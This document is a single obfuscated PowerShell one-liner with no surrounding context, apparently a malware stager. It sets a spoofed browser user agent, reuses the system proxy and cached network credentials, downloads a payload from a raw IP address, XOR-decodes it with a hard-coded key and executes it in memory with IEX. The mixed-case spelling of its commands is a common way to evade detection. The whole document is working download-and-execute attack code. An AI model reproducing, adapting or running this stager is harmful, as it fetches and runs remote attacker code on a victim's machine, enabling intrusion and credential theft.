
[SYstem.NET.SErviCEPoIntMAnaGEr]::EXPecT100CoNtinuE = 0;$WC=NeW-OBJeCt SYsTEM.Net.WebClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADErs.AdD('User-Agent',$u);$WC.PrOXY = [SYsteM.NET.WEBREqUESt]::DeFaULTWEbPROXy;$wC.ProXY.CredeNtIals = [SYStEM.NET.CrEdEnTialCacHE]::DEFAUlTNetWOrkCRedenTIAls;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[cHaR[]]$B=([Char[]]($WC.DOWnlOadSTriNg("http://138.121.170.12:3031/index.asp")))|%{$_-bXor$K[$i++%$K.LengTh]};IEX ($B-Join'')

